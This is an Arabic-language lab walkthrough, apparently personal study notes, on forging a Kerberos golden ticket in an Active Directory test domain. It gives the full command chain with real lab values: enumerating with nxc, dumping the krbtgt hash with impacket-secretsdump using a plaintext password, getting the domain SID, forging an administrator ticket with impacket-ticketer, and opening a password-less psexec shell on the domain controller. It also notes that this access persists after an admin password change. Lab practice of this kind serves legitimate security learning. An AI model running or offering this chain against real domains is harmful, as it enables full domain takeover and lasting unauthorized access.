

اولا عشان ننشأ التكت نحتاج ثلاث شيء رئيسية
معرفة اسم الدومين 
معرفة الهاش الخاص ب krbtgt
و SID


اولا عشان نعرف الدومين نستطيع استخدام أداة ال nxc  عبر الأمر 

```
nxc smb 192.168.227.139
```

![](../../../../Images/Pasted%20image%2020260929003434.png)

الان نحصل على الهاش الخاص ب krbtgt وذلك عن طريق سكربت seceretdump  باستخدام الأمر 

```
impacket-secretsdump user1:'12345l**'@192.168.227.139
```

![](../../../../Images/Pasted%20image%2020260929003720.png)

ثالثا نحصل على SID باستخدام سكربت lookupsid ونستطيع ايضا الاستفاده من موقع wadcoms  عشان نعرف كيفية الأستخدام لأغلب الأدوات وهو موقع مشابه ل GTFOBins ولكنه للويندوز 

![](../../../../Images/Pasted%20image%2020260929003914.png)

ستخرجنا ال SID عبر الأمر 

```
impacket-lookupsid lab.local/user1:'12345l**'@192.168.227.139
```

![](../../../../Images/Pasted%20image%2020260929003958.png)

الان ننشأ التكت عبر سكربت tickter  وذلك باستخدام الأمر 

```
impacket-ticketer -nthash 185bb88d43e59ba0a02661fca3471554 -domain-sid S-1-5-21-3636623485-1569682949-312350125 -domain lab.local -dc-ip 192.168.227.139 administrator

```

![](../../../../Images/Pasted%20image%2020260929004049.png)

```
nthash الهاش حق krbtgt

domain-sid SID

-domain الدومين 
```

الا نفعل اكسبورت للتكت عبر الأمر 

```
export KRB5CCNAME=administrator.ccache

administrator.ccache= اسم التكت الي أنشأناها من سكربت tickter

```

![](../../../../Images/Pasted%20image%2020260929004345.png)

الان نسجل الدخول عبر اي سكربت مثلا ال psexec او wimexec 

باستخدام الأمر 

```
impacket-psexec -k -no-pass -dc-ip 192.168.227.139 lab.local/Administrator@DC-1.lab.local
```

![](../../../../Images/Pasted%20image%2020260929004457.png)

```
DC-1 اسم الدومين نستطيع معرفته من أداة ال smb 
```

وكذه سجلنا عن طريق التكت وبدون باسورد 
وحتى لو تم تغير باسورد الأدمن سنظل نستطيع التسجيل بحسابه الى أن يتم تغير باسورد ال krbtgt 